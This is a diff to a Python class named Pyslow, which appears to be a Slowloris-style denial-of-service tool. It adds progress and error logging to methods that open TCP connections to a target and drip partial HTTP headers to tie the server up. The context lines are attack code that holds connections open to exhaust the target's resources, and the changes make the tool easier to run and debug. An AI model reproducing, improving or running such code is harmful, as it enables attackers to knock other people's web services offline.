@@ -110,6 +110,7 @@ class Pyslow:
 		return pkt
 	def building_socket(self):
 		try:
+			print("Building socket...")
 			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
 			sock.settimeout(self.to)
 			sock.connect((self.tgt,int(self.port)))
@@ -117,7 +118,9 @@ class Pyslow:
 			if sock:
 				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
 				self.pkt_count += 1
-		except Exception:
+			print("Socket built and packet sent.")
+		except Exception as e:
+			print(f"Error: {e}")
 			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
 			sock.settimeout(self.to)
 			sock.connect((self.tgt,int(self.port)))
@@ -131,6 +134,7 @@ class Pyslow:
 		return sock
 	def sending_packets(self):
 		try:
+			print("Sending packet...")
 			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
 			sock.settimeout(self.to)
 			sock.connect((self.tgt,int(self.port)))
@@ -138,7 +142,9 @@ class Pyslow:
 			if sock:
 				sock.sendall('X-a: b\r\n')
 				self.pkt+=1
-		except Exception:
+			print("Packet sent.")
+		except Exception as e:
+			print(f"Error: {e}")
 			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
 			sock.settimeout(self.to)
 			sock.connect((self.tgt,int(self.port)))
